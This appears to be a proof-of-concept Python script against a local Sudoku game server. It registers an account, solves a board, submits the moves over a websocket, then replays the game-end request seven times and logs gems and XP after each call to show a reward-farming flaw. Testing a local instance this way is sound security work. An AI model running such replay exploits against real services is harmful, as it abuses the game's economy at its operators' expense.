import json, urllib.request, urllib.error, http.cookiejar, base64, time, asyncio, websockets

BASE="http://localhost:8080"; WS="ws://localhost:8080/ws/game"
U="farm"+str(int(time.time()))[-6:]; P="playpass123"
cj=http.cookiejar.CookieJar()
op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
AUTH="Basic "+base64.b64encode(f"{U}:{P}".encode()).decode(); TOK=None

def call(method,path,body=None,as_json=True):
    global TOK
    data=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(BASE+path,data=data,method=method)
    r.add_header("Accept","application/json")
    if data: r.add_header("Content-Type","application/json")
    if path!="/api/auth/register": r.add_header("Authorization",AUTH)
    if method!="GET" and TOK: r.add_header("X-XSRF-TOKEN",TOK)
    try:
        with op.open(r,timeout=30) as resp:
            t=resp.read().decode(); return resp.status,(json.loads(t) if t and as_json else t)
    except urllib.error.HTTPError as e:
        t=e.read().decode()
        try: return e.code,json.loads(t)
        except: return e.code,t

def solve(g):
    def ok(r,c,n):
        for i in range(9):
            if g[r][i]==n or g[i][c]==n: return False
        br,bc=r-r%3,c-c%3
        for i in range(3):
            for j in range(3):
                if g[br+i][bc+j]==n: return False
        return True
    for r in range(9):
        for c in range(9):
            if g[r][c]==0:
                for n in range(1,10):
                    if ok(r,c,n):
                        g[r][c]=n
                        if solve(g): return True
                        g[r][c]=0
                return False
    return True

async def main():
    global TOK
    print("register:", call("POST","/api/auth/register",{"username":U,"password":P})[0])
    s,sess=call("GET","/api/session"); TOK=sess["csrfToken"]
    print("gems at start:", call("GET","/api/economy/wallet")[1]["gems"])
    s,g=call("POST","/api/game/new?difficulty=1&chaos=false&mirror=false")
    gid=g["gameId"]
    grid=[[c["value"] for c in row] for row in g["cells"]]
    empties=[(r,c) for r in range(9) for c in range(9) if grid[r][c]==0]
    work=[row[:] for row in grid]; solve(work)
    print(f"game {gid}: {len(empties)} cells to fill")

    cookie="; ".join(f"{ck.name}={ck.value}" for ck in cj)
    async with websockets.connect(f"{WS}?gameId={gid}",
            additional_headers={"Authorization":AUTH,"Cookie":cookie},
            origin="http://localhost:8080") as ws:
        for (r,c) in empties:
            await ws.send(json.dumps({"type":"move","payload":
                {"row":r,"col":c,"oldVal":0,"newVal":work[r][c],"source":"PLAYER"}}))
            await asyncio.sleep(0.02)
        await asyncio.sleep(2.5)

    st=call("GET",f"/api/game/{gid}")[1]
    print("solved server-side:", st["solved"], "| moves:", st["moveCount"])
    print("gems after legit solve:", call("GET","/api/economy/wallet")[1]["gems"])

    print("\n--- replaying POST /api/game/{id}/end on a LEGITIMATELY solved board ---")
    for i in range(1,8):
        code,_=call("POST",f"/api/game/{gid}/end",as_json=False)
        w=call("GET","/api/economy/wallet")[1]
        print(f"  end #{i}: HTTP {code}  gems={w['gems']}  xp={w['xp']}")

asyncio.run(main())
